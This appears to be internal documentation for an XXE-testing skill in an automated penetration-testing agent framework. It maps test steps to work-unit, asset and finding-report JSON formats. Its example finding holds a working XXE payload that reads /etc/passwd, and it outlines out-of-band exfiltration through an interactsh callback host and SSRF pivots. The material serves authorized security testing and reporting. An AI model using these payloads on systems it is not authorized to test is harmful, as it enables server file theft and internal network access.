# rupu Wiring — xxe-testing

Every parse/handoff step in this skill ends by producing one of three
rupu-ingestible outputs: a work-units JSON array, `assets.mark` calls, or
`findings.report` calls. `scripts/gen_xxe.py` emits all three shapes
(`--work-units` from a sink list; `--findings`/`--assets` from a results file).

## 1. Work units (fan-out)

A clean JSON ARRAY file whose first character is `[`. rupu's `for_each:`
JSON-parses it (read via the `read_file` tool); a lead agent reads the same
file and `dispatch`es one child per element. Normalize/split through the
`work-units` skill before dispatch.

Element shape from `gen_xxe.py --sinks sinks.txt --work-units units.json`:

```json
[
  {
    "id": "xxe-example.com-api-import",
    "title": "Test XML sink for XXE: POST /api/import",
    "targets": ["https://example.com/api/import"],
    "hints": {
      "vector": "xml-body",
      "content_type": "application/xml",
      "payload_dir": "payloads/",
      "probe_order": "internal-entity, oob-param-entity, classic-read, blind-dtd, ssrf",
      "callback": "cbx7.oast.pro",
      "oob_subdomain": "u1-api-import.cbx7.oast.pro"
    }
  }
]
```

One unique `oob_subdomain` per sink so interactsh interactions map back to the
sink that fired.

## 2. Assets — `assets.mark`

Built-in `web` profile kinds (prefix `web:`). Depth ladder:
`mapped` -> `crawled` -> `tested` -> `exploited`. Record via the
`coverage-assets` skill.

```json
{
  "kind": "web:site",
  "label": "https://example.com",
  "coordinates": [{"t": "url", "v": "https://example.com"}],
  "depth": "mapped"
}
```

```json
{
  "kind": "web:route",
  "label": "POST /api/import — XXE confirmed (file read)",
  "coordinates": [
    {"t": "url", "v": "https://example.com"},
    {"t": "http_route", "v": "/api/import"}
  ],
  "depth": "exploited"
}
```

Depth rules for this skill:
- XML sink identified (content-type, WSDL, upload parser) → `mapped`/`crawled`
- probes sent, entities inert / DTD blocked → `tested`
- external resolution proven (OOB hit) or file read / SSRF achieved → `exploited`

Add `{"t":"param","v":"name"}` to coordinates when the injectable point is a
specific field (e.g. the reflected element used for in-band read).

## 3. Findings — `findings.report`

Scope `endpoint`, `target_ref` = the sink URL. Severity: `critical` for
arbitrary file read or cloud-credential theft; `high` for SSRF-only or
constrained read; `medium` for proven external resolution with no data access
(still a vulnerability — DoS/SSRF surface). Classification always both:
`WSTG-INPV-07` and `CWE-611` (use CWE-918 additionally in the rationale for
the SSRF pivot).

The `web` profile completeness checks require: finding pinned to a route/url,
an HTTP exchange in evidence, an OWASP-or-CWE classification — all three.

```json
{
  "title": "XML External Entity injection in /api/import (arbitrary file read)",
  "scope": "endpoint",
  "target_ref": "https://example.com/api/import",
  "severity": "critical",
  "classification": {"owasp": "WSTG-INPV-07", "cwe": "CWE-611"},
  "evidence": {
    "rationale": "The XML parser behind POST /api/import resolves external entities. A DOCTYPE declaring <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> referenced in the <name> element returned the contents of /etc/passwd in the response, proving arbitrary server-side file read. The same vector reaches internal HTTP services (SSRF, CWE-918).",
    "request": "POST /api/import HTTP/1.1\r\nHost: example.com\r\nContent-Type: application/xml\r\nContent-Length: 182\r\n\r\n<?xml version=\"1.0\"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<r><name>&xxe;</name></r>",
    "response": "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"imported\":\"root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:...\"}",
    "data_sample": "root:x:0:0:root:/root:/bin/bash (first line of /etc/passwd)",
    "payload": "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
    "oob": "optional: interactsh interaction record for blind cases (protocol, full-id, remote-address, timestamp)"
  }
}
```

Blind/OOB findings: evidence must still include the triggering HTTP request +
response, plus the interactsh/webserver log line showing the DTD fetch or
exfil hit; `rationale` names the channel (hosted-DTD HTTP exfil, FTP, error
message) and quotes the leaked sample.

File each payload via the `finding-report` skill.

## 4. Where each methodology step lands

| Step | rupu output |
|---|---|
| 1. Sinks enumerated | `assets.mark` web:route depth `mapped` + `gen_xxe.py --work-units` array |
| 2. Probes sent/parsed | results.json → assets `tested`/`exploited` |
| 3-5. Read / OOB / SSRF confirmed | `gen_xxe.py --results` → `findings.report` payloads + assets `exploited` |
| 6. Upload/pivot vectors tested | same results.json flow; new sinks loop back to step 1 work units |
